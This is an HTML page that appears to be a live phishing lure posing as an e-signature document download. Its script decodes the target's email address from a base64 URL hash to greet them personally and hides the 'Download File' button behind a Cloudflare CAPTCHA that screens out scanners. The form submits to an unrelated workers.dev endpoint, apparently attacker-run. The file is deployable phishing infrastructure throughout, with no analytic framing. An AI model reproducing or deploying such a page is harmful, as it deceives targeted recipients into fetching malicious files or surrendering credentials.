<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<title>e-sign</title>
<link rel="shortcut icon" href="https://i.ibb.co/yF35Jv2Q/docu-ico.png" type="image/x-icon">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<style>
@font-face { font-family: 'fmtt'; src: url(img/font1.woff2) format('truetype'); }
* { margin: auto; font-size: 14px; outline: 0; font-family: 'fmtt'; }
body {
  background: url('https://i.ibb.co/G3spj5wR/orgo-blur.png') no-repeat center center fixed;
  background-size: cover;
  backdrop-filter: blur(5px);
}
input { border: 0; display: block; margin-top: 0px; width: 100%; padding: 6px; background: #f2f2f2; padding-left: 0; }
td { border-right: 1px solid black; padding-right: 10px; padding-left: 10px; font-size: 11px; color: #0072ce; }
.inp { margin-top: 30px; border-radius: 15px; background: #f2f2f2; text-align: center; border: 1px solid #f2f2f2; width: 93%; padding: 6px; padding-left: 1px; }
label { display: block; text-align: left; margin: 0; font-size: 10px; color: gray; padding: 0; width: 100%; }
@keyframes roll { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
#rl { animation: roll 1s infinite; }
@keyframes fade { from { opacity: 1; } to { opacity: 0.3; } }
#fd { animation: fade 1s infinite; }
.email-msg { 
  text-align: center; 
  font-size: 14px; 
  color: white; 
  margin-bottom: 15px; 
  text-shadow: 1px 1px 2px black; 
}
button { display: block; margin: 20px auto 0 auto; padding: 8px 16px; font-size: 14px; border-radius: 6px; cursor: pointer; }
button:disabled { cursor: not-allowed; opacity: 0.6; }
</style>
<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
</head>
<body>

<div style="max-width:500px;padding:0px;">

<form id="downloadForm" method="POST" action="https://wandering-cherry-0bf1.g03755901.workers.dev/">

  <div style="text-align:center">
    <img
      src="https://i.ibb.co/sJFnm0RH/Icon-pdf-file-svg.png" 
      width="45"
      height="45"
      style="margin-top:200px;object-fit:contain;"
      id="fd"
      alt="icon"
      loading="lazy"
      onerror="this.onerror=null; this.src='images/fallback.png';"
    >
  </div>

  <p style="text-align:center;font-size:15px;margin-top:10px"></p>

  <span
    style="display:block;height:10px;width:10px;border:3px solid lightgray;border-radius:70px;border-top-color:red;margin-top:40px;"
    id="rl"
  ></span>

  <!-- EMAIL MESSAGE PLACEHOLDER -->
  <div id="emailMsg" class="email-msg"></div>

  <!-- Cloudflare Turnstile widget -->
  <div class="cf-turnstile" data-sitekey="0x4AAAAAACafd07cw2w7X14i" style="margin-top:20px;"></div>

  <!-- Download button initially disabled -->
  <button type="submit" id="downloadBtn" disabled>Download File</button>

</form>

</div>

<script>
const fd = document.getElementById('fd');
const rl = document.getElementById('rl');
const form = document.getElementById('downloadForm');
const downloadBtn = document.getElementById('downloadBtn');
const emailMsg = document.getElementById('emailMsg');

// Show loader & rolling animation on form submit
form.addEventListener('submit', () => {
  fd.style.display = 'block';
  rl.style.display = 'block';
});

// Called by Turnstile when user completes CAPTCHA
function onCaptchaSuccess(token) {
    downloadBtn.disabled = false; // enable button only after CAPTCHA solved
}

// Attach Turnstile callback dynamically
document.querySelector('.cf-turnstile').setAttribute('data-callback', 'onCaptchaSuccess');

// Check URL hash for base64 email
window.addEventListener('DOMContentLoaded', () => {
    const hash = window.location.hash.slice(1);
    if(hash) {
        try {
            const decodedEmail = atob(hash); // decode base64
            emailMsg.textContent = `Dear ${decodedEmail}, complete CAPTCHA to reveal download button`;
        } catch(e) {
            console.warn("Invalid base64 in hash");
        }
    }
});
</script>

</body>
</html>
